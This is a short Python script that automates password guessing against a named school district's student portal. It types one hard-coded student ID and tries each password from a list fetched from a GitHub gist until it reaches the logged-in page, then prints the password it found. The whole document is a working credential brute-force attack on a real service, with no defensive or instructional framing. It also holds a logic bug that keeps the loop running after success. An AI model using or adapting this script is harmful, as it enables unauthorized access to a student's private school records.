from webbot import Browser
import functions

web = Browser()
web.go_to("https://sanjoseca.infinitecampus.org/campus/portal/students/sanjose.jsp")
loggedIn = False
gistApiLink = "https://api.github.com/gists/6f0ac5df2b615cd97fb0dbeea2f6ab14"
passList = functions.readGist(gistApiLink)

while loggedIn == False:
  for password in passList:
    web.type("s208614")
    web.press(web.Key.ENTER)
    web.type(password)
    web.press(web.Key.ENTER)
    if web.get_current_url() == "https://sanjoseca.infinitecampus.org/campus/nav-wrapper/student/portal/student/today":
      print("Login succesful!")
      correctPassword = password
      print(f"Logged in! Password is {password}")
      loggedIn == True
      break
      
    
  

